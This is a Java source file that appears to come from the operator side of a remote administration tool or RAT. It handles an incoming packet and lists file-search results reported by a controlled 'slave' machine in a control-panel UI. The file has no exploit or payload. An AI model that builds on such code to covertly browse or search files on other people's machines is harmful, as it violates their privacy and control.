package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlSearch;
import com.redpois0n.utils.IconUtils;

public class PacketFF extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String path = slave.readLine();
		String name = slave.readLine();
		boolean dir = slave.readBoolean();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlSearch panel = (PanelControlSearch) frame.panels.get("file searcher");
			panel.getModel().addRow(new Object[] { IconUtils.getFileIconFromExtension(name, dir), path, name });
		}
	}

}
